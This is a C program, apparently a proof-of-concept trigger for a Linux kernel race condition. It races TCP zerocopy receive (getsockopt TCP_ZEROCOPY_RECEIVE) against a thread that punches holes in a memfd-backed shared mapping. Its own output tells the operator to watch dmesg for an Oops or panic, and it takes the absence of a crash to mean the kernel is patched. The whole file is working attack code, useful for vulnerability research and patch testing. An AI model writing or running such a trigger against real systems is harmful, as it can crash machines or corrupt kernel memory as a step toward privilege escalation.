#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdint.h>

#ifndef TCP_ZEROCOPY_RECEIVE
#define TCP_ZEROCOPY_RECEIVE 35
#endif

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

#define MAIN_TCP_PUNCH_SHMEM_LEN (16 * 1024 * 1024)

static atomic_int punch_go = 0;
static atomic_int punch_stop = 0;
static atomic_int punch_phase = 0;

struct punch_state {
  int fd;
  size_t page_size;
};

static void *punch_thread(void *arg) {
  struct punch_state *state = arg;
  while (!atomic_load(&punch_go) && !atomic_load(&punch_stop)) {
    sched_yield();
  }
  while (!atomic_load(&punch_stop)) {
    if (fallocate(state->fd, 0, 0, MAIN_TCP_PUNCH_SHMEM_LEN) != 0) {
      fprintf(stderr, "punch fallocate alloc errno=%d\n", errno);
      break;
    }
    atomic_store(&punch_phase, 1);
    if (fallocate(state->fd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
                  (off_t)state->page_size,
                  MAIN_TCP_PUNCH_SHMEM_LEN - state->page_size) != 0) {
      fprintf(stderr, "punch fallocate hole errno=%d\n", errno);
      break;
    }
    atomic_store(&punch_phase, 0);
  }
  return NULL;
}

static int make_pair(int *client_fd, int *server_fd) {
  int listener = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (listener < 0) return -1;

  int one = 1;
  setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

  struct sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  addr.sin_port = 0;

  if (bind(listener, (struct sockaddr *)&addr, sizeof(addr)) != 0 ||
      listen(listener, 1) != 0) {
    int saved = errno;
    close(listener);
    errno = saved;
    return -1;
  }

  socklen_t addr_len = sizeof(addr);
  if (getsockname(listener, (struct sockaddr *)&addr, &addr_len) != 0) {
    int saved = errno;
    close(listener);
    errno = saved;
    return -1;
  }

  *client_fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (*client_fd < 0) {
    int saved = errno;
    close(listener);
    errno = saved;
    return -1;
  }

  if (connect(*client_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
    int saved = errno;
    close(*client_fd);
    close(listener);
    errno = saved;
    return -1;
  }

  *server_fd = accept4(listener, NULL, NULL, SOCK_CLOEXEC);
  int saved = errno;
  close(listener);
  if (*server_fd < 0) {
    close(*client_fd);
    errno = saved;
    return -1;
  }
  return 0;
}

static void put64(unsigned char *p, size_t off, uint64_t v) {
  memcpy(p + off, &v, sizeof(v));
}

static void put32(unsigned char *p, size_t off, uint32_t v) {
  memcpy(p + off, &v, sizeof(v));
}

int main() {
  int client_fd = -1;
  int server_fd = -1;
  int punch_fd = -1;
  char *map = NULL;
  pthread_t puncher;

  if (make_pair(&client_fd, &server_fd) != 0) {
    perror("make_pair");
    return 1;
  }

  size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
  punch_fd = (int)syscall(SYS_memfd_create, "main-tcp-punch", MFD_CLOEXEC);
  if (punch_fd < 0) {
    perror("memfd_create");
    return 1;
  }
  if (fallocate(punch_fd, 0, 0, MAIN_TCP_PUNCH_SHMEM_LEN) != 0) {
    perror("fallocate");
    return 1;
  }

  map = mmap(NULL, MAIN_TCP_PUNCH_SHMEM_LEN, PROT_READ | PROT_WRITE,
             MAP_SHARED, punch_fd, 0);
  if (map == MAP_FAILED) {
    perror("mmap");
    return 1;
  }
  for (size_t off = 0; off < MAIN_TCP_PUNCH_SHMEM_LEN; off += page_size) {
    map[off] = 0x55;
  }

  struct punch_state state = {
    .fd = punch_fd,
    .page_size = page_size,
  };
  if (pthread_create(&puncher, NULL, punch_thread, &state) != 0) {
    perror("pthread_create");
    return 1;
  }

  int route_attempts = 2000;
  int arm_seq = 16;

  printf("[*] Starting race test (%d attempts, arm_seq=%d)...\n", route_attempts, arm_seq);
  printf("[*] Watch dmesg for BUG/Oops/panic in parallel!\n\n");

  atomic_store(&punch_stop, 0);
  atomic_store(&punch_phase, 0);
  atomic_store(&punch_go, 1);

  char sendbuf[64];
  memset(sendbuf, 0x33, sizeof(sendbuf));

  for (int i = 1; i <= route_attempts; i++) {
    (void)send(server_fd, sendbuf, sizeof(sendbuf), MSG_DONTWAIT);

    while (atomic_load(&punch_phase)) {
      sched_yield();
    }
    for (int spin = 0; !atomic_load(&punch_phase) && spin < 10000000; spin++) {
      __asm__ volatile("yield" ::: "memory");
    }

    unsigned char zc[0x40];
    memset(zc, 0, sizeof(zc));
    put64(zc, 0x18, (uint64_t)(uintptr_t)(map + page_size));
    put32(zc, 0x20, sizeof(sendbuf));
    put64(zc, 0x28, 0xdeadbeefcafe0000ULL);
    put64(zc, 0x30, 0xcafebabedead0000ULL);

    socklen_t len = sizeof(zc);
    errno = 0;
    int ret = getsockopt(client_fd, IPPROTO_TCP, TCP_ZEROCOPY_RECEIVE, zc, &len);
    int saved_errno = errno;

    if (i >= arm_seq) {
      for (int spin = 0; spin < 20000; spin++) {
        __asm__ volatile("yield" ::: "memory");
      }
    }

    if ((i % 100) == 0 || ret != 0) {
      printf("seq=%d send_ret=OK getsockopt_ret=%d errno=%d len=%u "
             "zc[0x18]=%p zc[0x28]=0x%llx zc[0x30]=0x%llx\n",
             i, ret, saved_errno, (unsigned)len,
             (void*)*(uint64_t*)(zc + 0x18),
             (unsigned long long)*(uint64_t*)(zc + 0x28),
             (unsigned long long)*(uint64_t*)(zc + 0x30));
    }
  }

  atomic_store(&punch_go, 0);
  atomic_store(&punch_stop, 1);
  pthread_join(puncher, NULL);

  printf("\n[*] Done. No kernel crash = likely patched or race didn't fire.\n");

  if (map) munmap(map, MAIN_TCP_PUNCH_SHMEM_LEN);
  if (punch_fd >= 0) close(punch_fd);
  if (server_fd >= 0) close(server_fd);
  if (client_fd >= 0) close(client_fd);

  return 0;
}
